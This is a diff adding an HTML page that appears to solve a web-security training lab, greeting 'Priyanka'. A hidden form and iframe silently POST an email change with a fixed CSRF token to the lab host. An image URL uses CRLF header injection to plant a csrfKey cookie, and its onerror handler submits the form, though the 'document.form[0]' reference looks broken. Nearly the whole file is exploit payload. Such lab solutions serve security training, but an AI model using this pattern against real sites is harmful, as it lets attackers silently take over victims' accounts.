@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title></title>
+</head>
+<body>
+	<h1>Hello Priyanka!</h1>
+	<iframe style="display:none" name="csrf-iframe"></iframe>
+	<form action="https://0a1f000303be080a82c81018007d00a3.web-security-academy.net/my-account/change-email" method="POST" id="csrf-form" target="csrf-iframe">
+		<input type="hidden" name="email" value="test5@test.ca"/>
+		<input type="hidden" name="csrf" value="gQGN6uSFOEr2qbF22B1TFAJcNbDaZUyJ">
+	</form>
+	<img style="display:none;" src="https://0a1f000303be080a82c81018007d00a3.web-security-academy.net/?search=hat%0d%0aSet-Cookie:%20csrfKey=iNkHcAhVzpEfyi8aUGBBdAcIcP0MldVY" onerror="document.form[0].submit()">
+</body>
+</html>
